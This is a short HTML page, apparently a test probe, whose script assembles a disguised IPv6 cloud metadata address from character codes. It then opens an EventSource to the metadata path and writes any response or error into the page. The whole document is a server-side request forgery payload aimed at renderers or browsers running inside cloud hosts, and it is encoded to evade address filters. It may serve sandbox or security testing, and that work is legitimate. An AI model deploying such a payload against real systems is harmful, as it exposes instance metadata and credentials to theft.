<!DOCTYPE html>
<html><body>
<h1>EVENTSOURCE_TEST</h1>
<div id="r1">LOADING</div>
<script>
try {
  var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
  var proto = String.fromCharCode(104,116,116,112);
  var url = proto + '://[' + ip + ']/latest/meta-data/';
  var es = new EventSource(url);
  es.onopen = function() { document.getElementById('r1').innerText = 'ES_OPEN'; };
  es.onmessage = function(e) { document.getElementById('r1').innerText = 'ES_DATA:' + e.data; };
  es.onerror = function(e) { document.getElementById('r1').innerText = 'ES_ERROR:' + e.type; };
} catch(e) {
  document.getElementById('r1').innerText = 'ES_EXCEPTION:' + e.name + ':' + e.message;
}
</script>
</body></html>
